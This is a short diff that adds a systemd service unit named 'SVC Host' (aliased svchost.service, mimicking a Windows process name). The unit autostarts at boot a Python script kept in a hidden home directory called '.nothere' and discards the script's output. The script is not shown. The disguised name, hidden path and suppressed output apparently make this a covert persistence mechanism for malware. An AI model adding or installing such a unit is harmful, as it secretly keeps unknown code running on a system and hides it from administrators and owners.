@@ -1,0 +1,13 @@
+[Unit]
+Description=SVC Host
+
+[Service]
+Type=simple
+ExecStart=/home/ubuntu/.nothere/svchost.py
+StandardOutput=null
+WorkingDirectory=/home/ubuntu/.nothere
+
+[Install]
+WantedBy=multi-user.target
+Alias=svchost.service
+
